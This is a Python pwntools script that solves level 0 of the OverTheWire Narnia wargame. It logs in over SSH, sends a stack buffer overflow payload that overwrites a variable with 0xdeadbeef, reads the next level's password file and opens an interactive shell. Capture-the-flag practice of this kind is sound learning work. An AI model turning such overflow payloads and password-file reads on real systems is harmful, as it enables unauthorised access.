from pwn import *
import subprocess

#i like the debug context whenever i use pwntools
context.log_level='debug'


# these are all pretty self explanatory
level=0
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='narnia0'
port=2226


def conn():
    #basically just sshs into the level
    return ssh(user=user, host=host, password=password, port=port)
def getPass(shell):
    #this function prints the password
    print('The password for the next level is...')
    shell.sendline('cat /etc/narnia*/narnia' + str(level+1))
    flag=shell.recvuntil('$').split()[0]
def readCode(shell):
    #this function downloads the narnialevel.c file and displays it, and at the end removes the .c
    #file
    code=shell.download_data('/narnia/' + user + '.c')
    shell.download_file('/narnia/' + user + '.c')
    log.info('The code for this level is')
    print(code)
    subprocess.call(['rm',user+'.c'])


#context=(arch='i386', os='linux')

sh=conn()
readCode(sh)
exe=sh.run('/narnia/'+user)
exe.recvuntil(':')
#the payload that is to be sent
payload = 'a'*20 + p32(0xdeadbeef)
exe.sendline(payload)
#the flag is gotten
flag=getPass(exe)
#puts it into interactive mode so you can play around
exe.interactive()
